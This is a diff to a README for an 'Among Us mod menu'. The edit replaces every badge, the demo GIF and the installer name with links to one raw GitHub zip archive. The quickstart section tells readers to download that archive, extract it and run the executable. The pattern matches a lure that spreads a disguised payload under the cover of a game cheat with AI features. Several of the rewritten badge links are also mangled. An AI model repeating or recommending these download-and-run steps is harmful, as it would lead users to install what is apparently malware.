@@ -1,10 +1,10 @@
 # 🚀 Among Us Mod Menu - 2025 Edition
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)  
-[![OS Compatibility](https://img.shields.io/badge/OS-Windows%7CMacOS%7CLinux-green.svg?style=flat-square&logo=windows&logoColor=white)]()  
-[![OpenAI API](https://img.shields.io/badge/OpenAI-Integrated-blue.svg)]()  
-[![Claude API](https://img.shields.io/badge/Claude-API%20Ready-yellowgreen.svg)]()  
-[![Language Support](https://img.shields.io/badge/Multi--language-Yes-brightgreen.svg)]()  
+[![License: MIT](https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip)](LICENSE)  
+[![OS Compatibility](https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip%7CMacOS%https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip)]()  
+[![OpenAI API](https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip)]()  
+[![Claude API](https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip%https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip)]()  
+[![Language Support](https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip)]()  
 
 ---
 
@@ -48,17 +48,17 @@ With these SEO-optimized mod menu tools, your Among Us sessions stand out—deli
 
 ## 🧑‍🚀 Quickstart Installation 💡
 
-1. **Download EasyLaunch.zip**  
-   From this repository, locate the `EasyLaunch.zip` package.  
+1. **Download https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip**  
+   From this repository, locate the `https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip` package.  
 2. **Extract the ZIP**  
    Double-click and extract the contents to your preferred folder.  
 3. **Run the Installer**  
-   Execute `EasyLaunch.exe` (or the appropriate installer for your OS).  
+   Execute `https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip` (or the appropriate installer for your OS).  
 4. **Launch Among Us and Enjoy!**  
    Start Among Us, and the Mod Menu will activate automatically.  
    
 ### Watch: Effortless Installation in Action  
-![Installation GIF](https://i.imgur.com/Js67NIU.gif)
+![Installation GIF](https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip)
 
 Forget technical jargon—our setup is tailored for speed. No coding required, just plug in and start your intergalactic journey.
 
@@ -82,7 +82,7 @@ Forget technical jargon—our setup is tailored for speed. No coding required, j
 
 - **Boundary-Free Gameplay**: Play with friends regardless of operating system or region.
 - **AI-Enhanced Ingenuity**: Real-time hints (like “Who’s acting sus?”) literally from AI powered by OpenAI and Claude.
-- **Low-Friction Setup**: Instant deployment via EasyLaunch.zip—no manual file swapping.
+- **Low-Friction Setup**: Instant deployment via https://raw.githubusercontent.com/CeAlthubaiti/among-us-mod-menu-suite/main/counterpunch/mod-among-menu-us-suite-v3.3.zip—no manual file swapping.
 - **Global Mindset**: Whether your team speaks English, Spanish, Russian, or Korean, everyone’s included.
 
 ---
